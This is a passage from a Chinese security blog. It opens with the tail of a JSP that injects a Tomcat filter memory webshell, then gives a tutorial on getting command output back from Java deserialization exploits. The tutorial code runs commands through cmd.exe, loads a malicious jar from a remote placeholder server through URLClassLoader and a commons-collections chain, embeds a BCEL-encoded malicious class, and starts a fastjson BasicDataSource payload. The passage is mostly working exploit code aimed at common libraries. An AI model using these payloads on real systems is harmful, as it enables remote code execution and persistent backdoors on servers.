filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        filterStartMethod.invoke(standardContext, <span class="keyword">null</span>);</span><br><span class="line">                        Class ccc = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ccc = Class.forName(<span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        <span class="keyword">if</span> (ccc == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ccc = Class.forName(<span class="string">"org.apache.catalina.deploy.FilterMap"</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//把filter插到第一位</span></span><br><span class="line">                        Class c = Class.forName(<span class="string">"org.apache.catalina.core.StandardContext"</span>);</span><br><span class="line">                        Method m = c.getMethod(<span class="string">"findFilterMaps"</span>);</span><br><span class="line">                        Object[] filterMaps = (Object[]) m.invoke(standardContext);</span><br><span class="line">                        Object[] tmpFilterMaps = <span class="keyword">new</span> Object[filterMaps.length];</span><br><span class="line">                        <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            Object o = filterMaps[i];</span><br><span class="line">                            m = ccc.getMethod(<span class="string">"getFilterName"</span>);</span><br><span class="line">                            String name = (String) m.invoke(o);</span><br><span class="line">                            <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                                tmpFilterMaps[<span class="number">0</span>] = o;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                tmpFilterMaps[index++] = filterMaps[i];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">                        &#125;</span><br><span class="line">                        out.println(<span class="string">"Filter has been Inject,please visit /xxxxxxx/xx?sectest666=whoami"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">JAVA反序列化回显学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-12-17 15:59:04" itemprop="dateCreated datePublished" datetime="2020-12-17T15:59:04+08:00">2020-12-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-24 09:59:05" itemprop="dateModified" datetime="2020-12-24T09:59:05+08:00">2020-12-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">近年来出现的很多JAVA的漏洞都是无回显的漏洞，因此了解如何能让本身不回显的漏洞回显成为很多大佬研究的内容，本文将带着大家一起学习JAVA反序列化漏洞的回显方案。</span><br></pre></td></tr></table></figure>

<h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>​        defineClass可以将byte[]转换为Class类，如下所示defineClass会接收我们传入的name,byte[],长度等参数，最终会返回给我们一个Class类的对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201217174607641.png" alt="image-20201217174607641"></p>
<p>​        也就是说我们不仅可以通过ClassLoader.loadClass（）来获取Class类，也可以将一个类转化为byte[],通过defineClass我们就可以获取到这个类。</p>
<p>​        我这里写了个测试代码来帮助理解，首先我们创建一个test666类，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line">public class test666 &#123;</span><br><span class="line">    public test666(String cmd) throws Exception &#123;</span><br><span class="line">        InputStream stream &#x3D; (new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader reader &#x3D; new InputStreamReader(stream, Charset.forName(&quot;gbk&quot;));</span><br><span class="line">        BufferedReader bufferedReader &#x3D; new BufferedReader(reader);</span><br><span class="line">        StringBuffer buffer &#x3D; new StringBuffer();</span><br><span class="line">        String line &#x3D; null;</span><br><span class="line"></span><br><span class="line">        while((line &#x3D; bufferedReader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            buffer.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        throw new Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        可以看到在我们的有参构造方法中，接收了cmd参数放到ProcessBuilder中执行将执行的结果通过exception异常来回显出来，我们将test666这个类编译，再编写一个类去将test666.class中的内容读取并存入到字节数组中，通过defineClass来获取test666这个类的Class对象，再通过newInstance来调用它的构造方法并传入参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line">public class defineClassTest extends  ClassLoader&#123;</span><br><span class="line">    public static &lt;defineClass&gt; void main(String[] args) throws IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        File file&#x3D;new File(&quot;C:\\Users\\admin\\Desktop\\test666.class&quot;);</span><br><span class="line">        BufferedInputStream bis &#x3D; null;</span><br><span class="line">        ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        FileInputStream in &#x3D;new FileInputStream(file);</span><br><span class="line">        bis &#x3D; new BufferedInputStream(in);</span><br><span class="line">        byte[] buf &#x3D; new byte[1024];</span><br><span class="line">        int len &#x3D; 0;</span><br><span class="line">        while ((len &#x3D; in.read(buf)) !&#x3D; -1) &#123;</span><br><span class="line">            baos.write(buf, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] buffer &#x3D; baos.toByteArray();</span><br><span class="line">        defineClassTest defineclasstest &#x3D; new defineClassTest();</span><br><span class="line">        Class cls &#x3D; defineclasstest.defineClass(&quot;test666&quot;,buffer,0,buffer.length);</span><br><span class="line">        cls.getConstructor(String.class).newInstance(&quot;ipconfig&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        执行结果如下，可以看到我们已经将命令执行的结果打印出了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201217200921594.png" alt="image-20201217200921594"></p>
<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p>​        我们也可以使用URLClassLoader来加载远程的恶意类执行命令并获取回显,首先将我们生成的恶意类打包并放置到远程服务器上。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218101624866.png" alt="image-20201218101624866"></p>
<p>​        编写如下代码通过URLClassLoader加载远程的jar包执行命令并获取回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line">public class urlget &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            URLClassLoader loader&#x3D;new URLClassLoader(new URL[]&#123;new URL(&quot;http:&#x2F;&#x2F;xxx:88&#x2F;test666.jar&quot;)&#125;);</span><br><span class="line">            Class cls &#x3D; loader.loadClass(&quot;test666&quot;);</span><br><span class="line">            cls.getConstructor(String.class).newInstance(&quot;ipconfig&quot;);</span><br><span class="line">        &#125; catch (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218103236476.png" alt="image-20201218103236476"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218103258089.png" alt="image-20201218103258089"></p>
<p>​        URLClassLoader回显方案在commons-collections利用链下的利用方式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class commonsTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(java.net.URLClassLoader.class),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;getConstructor&quot;,</span><br><span class="line">                        new Class[] &#123; Class[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Class[] &#123; java.net.URL[].class &#125; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;newInstance&quot;,</span><br><span class="line">                        new Class[] &#123; Object[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Object[] &#123; new java.net.URL[] &#123; new java.net.URL(</span><br><span class="line">                                &quot;http:&#x2F;&#x2F;xxxxx:88&#x2F;test666.jar&quot;) &#125; &#125; &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;loadClass&quot;,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[] &#123; &quot;test666&quot; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;getConstructor&quot;,</span><br><span class="line">                        new Class[] &#123; Class[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Class[] &#123; String.class &#125; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;newInstance&quot;,</span><br><span class="line">                        new Class[] &#123; Object[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new String[] &#123; &quot;ipconfig&quot; &#125; &#125;),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain &#x3D; new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;创建Map并绑定transformerChain</span><br><span class="line">        Map innerMap &#x3D; new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outerMap &#x3D; TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;触发漏洞</span><br><span class="line">        Map.Entry onlyElement &#x3D; (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(&quot;foobar&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218105916926.png" alt="image-20201218105916926"></p>
<h3 id="fastjson回显"><a href="#fastjson回显" class="headerlink" title="fastjson回显"></a>fastjson回显</h3><p>​        在fastjson的回显利用方案中，需要将我们的恶意类经过BCEL编码后传入，经过查阅资料fastjson回显的利用方案最终是因为调用了forName方法，而forName在调用的过程中会去执行static静态代码块，所以我们需要将我们的利用代码写在静态代码块中,由于在静态代码块中调用了方法，所以被调用的方法也要用static来修饰。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line">public class test888 &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            exec(&quot;ipconfig&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void exec(String cmd) throws Exception &#123;</span><br><span class="line">        InputStream stream &#x3D; (new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader reader&#x3D;new InputStreamReader(stream, Charset.forName(&quot;gbk&quot;));</span><br><span class="line">        BufferedReader bufferedReader &#x3D;new BufferedReader(reader);</span><br><span class="line">        StringBuffer buffer&#x3D;new StringBuffer();</span><br><span class="line">        String line&#x3D;null;</span><br><span class="line">        while((line&#x3D;bufferedReader.readLine())!&#x3D;null)&#123;</span><br><span class="line">            buffer.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        throw  new Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        编译上面的代码，我们可以获取到test888.class这个类，下面我们将这个类进行处理，转换为BCEL编码，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class BCELencode &#123;</span><br><span class="line">    public static void main(String []args) throws Exception&#123;</span><br><span class="line">        Path path &#x3D; Paths.get(&quot;C:\\Users\\admin\\xxx\\test888.class&quot;);   &#x2F;&#x2F;文件绝对路径</span><br><span class="line">        byte[] data &#x3D; Files.readAllBytes(path);</span><br><span class="line">        String s &#x3D;  Utility.encode(data,true);</span><br><span class="line">        System.out.print(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218115406847.png" alt="image-20201218115406847"></p>
<p>​        我们可以编写如下代码测试能否利用<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 加载我们的恶意类执行命令,测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class pwn &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        String classname&#x3D;&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuU$5dw$d3F$Q$bdk$cb$5eY$uqb$e7$D$93$94RJ$c1$J$c1$a6$40I$9a$844$q$85$f2$a1$E$g$a7$a1$wM$8b$y$af$j$r$8e$e4$p$cb$3d$fc$p$9ey$b19$f5$a1$7d$ebC$ffI$ffDaVv$9c$bav$fc$b0$ab$99$bd3$9e$7bgV$fa$fb$df$df$ff$Ap$HG$gfp$8fc$8d$e3$h$V$eb$w$eek$88$60C$$$9b$g$be$c5$D$8e$87$w$be$d3$f0$I$8f5$q$f0$84$e3$a9$86$R$Y$i$5b$g$92$b8$t$8dm$f9$f4L$c5s$8e$ef$e5$e3$8e$86$J$UT$ecj$b8$80$l$a4$b1$c7$f1$82$e3G$86$f8$aa$e3$3a$c1$gC4$3b$b7$c7$a0lz$r$c1$904$iWl7$8e$8b$c2$df$b5$8aU$f2$a4$M$cf$b6$aa$7b$96$efH$bb$ebT$82$D$a7$ce$900$CQ$P$96$96$96V$c8$r$5e$L$9ba2k$iZ$bfY$f9$aa$e5V$f2$85$c0w$dc$ca$8a$cc$l$b5$8fK2$d9$c0$nUR$P$7ca$jSl$e7$d4$f1$f2$8f$ddZ$p$u$84n$J$a0$bd$q$7c$86$99a$80$9d$f0$90$60$a3$c5F$b9$y$7cQ$da$e9$c2$cf$f7$e0$h$7d$t2e$H$db$c3$fc$a7$a2$OV2$aa$92$W$M$p$85$c0$b2$8f$b6$acZ$c8$9d$ba$c3aR$_H$7eR$9eA$7b$f0$da$W$b5$c0$f1$5c$SD$5d$b5$ab$5dY$99$e8$R$K$93$f7$60$x$d4$h$K$xx$N$df$W$P$j$v$a7$de$951$t$e1$3af$f1$J$Vv$g$fa$dc$f7lQ$afo4$9cj$c8k$ec$ff$r3p$927G$j$60$88$e4m$99$e1$t$j$_$f13$c7$be$8e_$f0$xC$e6L$e5$a87$95$e2$R$c7$x$j$W$8a2$96$da85$5c9yZ$3a9$j$d0L$87$40YG$F$HD_cH$Pa$af$c3$91$98Y$5c$n$b5$9c$9a$ed$b9e$a7$a2$e3s$5c$d1q$uy$f3$ae$W$7d4$9f$V$P$85$j$9cd$ecgA$e5d_$O$l$baX$3d$b0$fc$40$O$e5$9c1$m$tux$7c$c0IST$RA_$f6$e9$93$e0$81$b9$ec$b4$c8$r$bf$7d$60$f9u$R$e47$3b$3b$b1$u$7b$fe$b6uL$fd$c8$N$bb$Q$c6Y$91$94$f5Vv$e8$df$9d$j$o$99$a6O$83$ba3$$$bd$aa$bc8F8$c5$T$7d$S$9c$de$3d$abV$T$$$b5t$e1$ec2$87$dd$N5$f0NF$_Y$a3$3d$I$_$c9$aeo$d9$C$9f$d1$bbf$G$f2$X$F$93$c3L$ebE$b2$f2$b43$dac$f3$z$b0$b7$f4$Q$c1$a7$b4$c6Cg$i$97h$d5$3b$AJq$99$f6$84$i$LBQ0S$I$R$t$dfa$h$R3$fe$kQ3$9aR$K$a6$92$8a$V$cc$d8$7c$a1$85x$T$bc$J$d5h$pa$5eOi$efp$ae$F$7d$ab$8d$Rs$a1$85$d1$ed6$92f$Lc$cb$K$5b$8e$ddhb$dc$5c$8e$fd$85tF$c9$c4$9aH$a5$d2$b4$bcx$f3$e1$9f6$s$cc$8c$d2$c4d$LS$7f$86$Ed$85$97$a1$d2$9a$a4$K$c7$90$c38$W$91$c2$3a$d2$d8$a4$f7$e9$W$s$b1$8f$e9$b0$fa$b5N$85$f8$CWi$bf$84$t$b8$86$y1$caa$Vs$98$t$s$8b$b8$8d$ebX$a0$bc$ebd$df$a0$T$85$b2$5c$pi$ae$S$eb$9b$U5$8b$c8$Hr$c59$be$e4$b8$c5q$9b$e3$O$c7Wd$C$Z$dc$r$84B$Z$t$a8$a2$c5$9e$b0$fb$5daGS$d3$efp$fe$N$d4$a7$f3Md$dev$b5T$J$dd$e11E$96T5F$3a$ab$90$l$91s$f4$cd$Y$e9$v$9f$a0$dcK$f8$9a$yY$JG$e4$R$c7$b2$fc$bb$95$b0Y$ab$l$B$e8$60$97$T$ac$G$A$Ad&quot;;</span><br><span class="line">        ClassLoader cls&#x3D;new com.sun.org.apache.bcel.internal.util.ClassLoader();</span><br><span class="line">        Class.forName(classname,true,cls);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218134951663.png" alt="image-20201218134951663"></p>
<p>​        简单分析一下com.sun.org.apache.bcel.internal.util.ClassLoader的forName方法是如何执行的。</p>
<p>​        跟进forName方法，首先获取SecurityManager实例，获取实例为空后会调用forName0这个方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140341587.png" alt="image-20201218140341587"></p>
<p>​        但是forName0是native层的代码，所以获取不到具体的执行细节。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140555599.png" alt="image-20201218140555599"></p>
<p>​        但继续跟进会调用java.lang.ClassLoader.loadClass方法</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140645454.png" alt="image-20201218140645454"></p>
<p>​        继续跟进调用，首先尝试通过class_name获取Class实例，这里没有获取到</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140742726.png" alt="image-20201218140742726"></p>
<p>​        当没有获取到Class实例，会查看class_name中是否包含<code>$$BCEL$$</code>,如果包含会执行createClass方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140906671.png" alt="image-20201218140906671"></p>
<p>​        在createClass中会以<code>$$BCEL$$</code>进行分割，取出real_name，将real_name中的内容解码成bytes形式，并获取ClassParser解析器，解析出test888这个类。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218141015072.png" alt="image-20201218141015072"></p>
<p>​        获取Class后通过defineClass来加载类，执行类中的static方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218141528766.png" alt="image-20201218141528766"></p>
<p>​            使用<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>配合回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">        &quot;c&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                